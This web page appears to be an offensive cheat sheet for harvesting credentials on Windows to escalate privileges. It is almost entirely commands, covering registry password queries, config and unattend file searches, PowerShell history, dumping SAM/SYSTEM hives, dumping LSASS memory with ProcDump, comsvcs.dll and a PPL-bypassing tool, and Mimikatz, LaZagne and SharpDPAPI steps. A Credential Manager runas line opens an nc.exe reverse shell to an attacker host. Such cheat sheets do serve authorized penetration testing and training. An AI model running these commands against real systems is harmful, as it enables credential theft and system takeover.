title: Windows PrivEsc — Credential Hunting
html:
Windows PrivEsc — Credential Hunting

Windows stores credentials in many locations — registry, config files, memory, credential manager, and DPAPI blobs. Lateral movement and privilege escalation often come from found credentials rather than binary exploitation.

Registry Credentials

AutoLogon Credentials

REM Plaintext credentials for automatic login
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AutoAdminLogon
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultDomainName

LSA Secrets

REM LSA secrets (requires SYSTEM)
reg query HKLM\SECURITY\Policy\Secrets

REM Dump with impacket on attacker (requires credentials)
REM impacket-secretsdump <domain>/<username>:<password>@<ip> -just-dc-user Administrator

VNC Credentials

REM RealVNC
reg query "HKCU\Software\ORL\WinVNC3\Password"
reg query "HKLM\SOFTWARE\ORL\WinVNC3\Password"

REM TigerVNC
reg query "HKCU\Software\TigerVNC\WinVNC4"

REM TightVNC
reg query "HKCU\Software\TightVNC\Server"
reg query "HKLM\SOFTWARE\TightVNC\Server" /v Password
reg query "HKLM\SOFTWARE\TightVNC\Server" /v ControlPassword

PuTTY / SSH Keys

REM PuTTY saved sessions
reg query HKCU\Software\SimonTatham\PuTTY\Sessions
reg query HKCU\Software\SimonTatham\PuTTY\Sessions /s

REM PuTTY SSH host keys
reg query HKCU\Software\SimonTatham\PuTTY\SshHostKeys

Search Registry for Passwords

REM Search entire registry for password strings
reg query HKLM /f password /t REG_SZ /s 2>nul
reg query HKCU /f password /t REG_SZ /s 2>nul

REM More targeted
reg query HKLM /f "pass" /t REG_SZ /s | findstr /i "password passwd"

Configuration Files

Web Configs

REM IIS web.config (database connection strings)
type C:\inetpub\wwwroot\web.config
dir /s /b C:\web.config 2>nul
dir /s /b C:\inetpub\*.config 2>nul

REM ASP.NET application settings
dir /s /b C:\appsettings.json C:\appsettings.*.json 2>nul

REM Search IIS configs
dir /s /b "C:\inetpub\" 2>nul | findstr /i ".config .xml"

Unattended Install Files

REM Contains base64-encoded or plaintext admin passwords
dir /s /b C:\unattend.xml 2>nul
dir /s /b C:\Panther\unattend.xml 2>nul
dir /s /b C:\Panther\Unattend\unattend.xml 2>nul
dir /s /b C:\Windows\Panther\unattend.xml 2>nul
dir /s /b C:\Windows\Panther\Unattend.xml 2>nul
dir /s /b C:\Windows\system32\sysprep.inf 2>nul
dir /s /b C:\Windows\system32\sysprep\sysprep.xml 2>nul

REM Check content
type C:\Windows\Panther\Unattend.xml

REM Decode base64 password
# [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('base64here'))

Generic Credential File Search

REM Find files with 'pass' in name
dir /s /b C:\*pass* 2>nul | findstr /v AppData

REM Search file contents for credentials
findstr /si password C:\*.xml C:\*.ini C:\*.txt C:\*.config 2>nul
findstr /spin "password" C:\Users\*.txt 2>nul

REM PowerShell recursive grep
Get-ChildItem -Path C:\ -Recurse -ErrorAction SilentlyContinue | Select-String -Pattern 'password|passwd|pwd' -ErrorAction SilentlyContinue | Select-Object Path,LineNumber,Line | Out-File C:\Temp\creds.txt

PowerShell History

# PSReadLine history (commands typed in PowerShell sessions)
Get-Content (Get-PSReadlineOption).HistorySavePath

# Default path
type "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"

# All users
cmd /c dir /s /b C:\Users\*\ConsoleHost_history.txt 2>nul

# Grep for passwords in history
Get-Content (Get-PSReadlineOption).HistorySavePath | Select-String -Pattern 'password|passwd|-p |/p '

Credential Manager

REM List stored credentials
cmdkey /list

REM Use stored credentials with runas
runas /savecred /user:Administrator cmd.exe
runas /savecred /user:<domain>\Administrator "cmd /c C:\Temp\nc.exe <lhost> <lport> -e cmd.exe"

REM Dump Credential Manager via Mimikatz
# vault::cred
# vault::list

REM LaZagne (automated credential harvester)
LaZagne.exe all
LaZagne.exe windows
LaZagne.exe browsers

SAM/SYSTEM Dump

Shadow Copy Method

REM List shadow copies
vssadmin list shadows
wmic shadowcopy list brief

REM Copy SAM and SYSTEM from shadow copy
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SAM C:\Temp\SAM
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM C:\Temp\SYSTEM

REM Create new shadow copy if none exist (requires admin)
wmic shadowcopy call create Volume='C:\'

Registry Save Method

REM Save hives directly (requires admin/SYSTEM)
reg save HKLM\SAM C:\Temp\SAM
reg save HKLM\SYSTEM C:\Temp\SYSTEM
reg save HKLM\SECURITY C:\Temp\SECURITY

REM Extract hashes on attacker with impacket
REM impacket-secretsdump -sam SAM -system SYSTEM -security SECURITY LOCAL

LSASS Dump

REM Task Manager method (GUI)
REM Requires admin rights — right-click lsass.exe → Create dump file

REM ProcDump (Sysinternals)
procdump.exe -accepteula -ma lsass.exe C:\Temp\lsass.dmp

REM comsvcs.dll MiniDump (no extra tools)
tasklist | findstr lsass
powershell -c "$id = (Get-Process lsass).Id; rundll32 C:\Windows\System32\comsvcs.dll MiniDump $id C:\Temp\lsass.dmp full"

REM Nanodump (bypasses PPL)
nanodump.exe --pid <lsass_pid> --write C:\Temp\lsass.dmp

REM Parse dump on attacker
REM pypykatz lsa minidump lsass.dmp
REM mimikatz: sekurlsa::minidump lsass.dmp → sekurlsa::logonPasswords

REM Mimikatz live (on target with admin rights)
REM privilege::debug
REM sekurlsa::logonPasswords
REM lsadump::sam
REM lsadump::secrets

DPAPI

DPAPI (Data Protection API) encrypts credentials, browser passwords, certificates, and SSH keys using the user's master key, which is derived from their password.

REM DPAPI master keys
dir /a C:\Users\<username>\AppData\Roaming\Microsoft\Protect\
dir /a C:\Users\<username>\AppData\Roaming\Microsoft\Protect\S-1-5-21-*\

REM DPAPI blobs (encrypted data)
dir /a C:\Users\<username>\AppData\Roaming\Microsoft\Credentials\
dir /a C:\Users\<username>\AppData\Local\Microsoft\Credentials\

REM Decrypt with Mimikatz (requires SYSTEM or user context)
REM dpapi::masterkey /in:"C:\Users\<username>\AppData\Roaming\Microsoft\Protect\SID\masterkey" /rpc
REM dpapi::cred /in:"C:\Users\<username>\AppData\Roaming\Microsoft\Credentials\GUID"

REM SharpDPAPI (from attacker perspective)
REM SharpDPAPI.exe credentials
REM SharpDPAPI.exe machinetriage (as SYSTEM)

REM Decrypt with user password known
REM SharpDPAPI.exe credentials /password:<password>

REM impacket-dpapi on attacker with domain credentials
REM impacket-dpapi masterkey -file masterkey -dc-ip <dc-ip> -domain <domain> -password <password> -username <username>

REM Browser passwords (Chrome DPAPI)
REM SharpChrome.exe logins
REM LaZagne.exe browsers
excerpt: Hunt Windows credentials — registry (AutoLogon, VNC, PuTTY), config files, PowerShell history, Credential Manager, SAM/SYSTEM dump via shadow copy, LSASS dump, and DPAPI decryption.
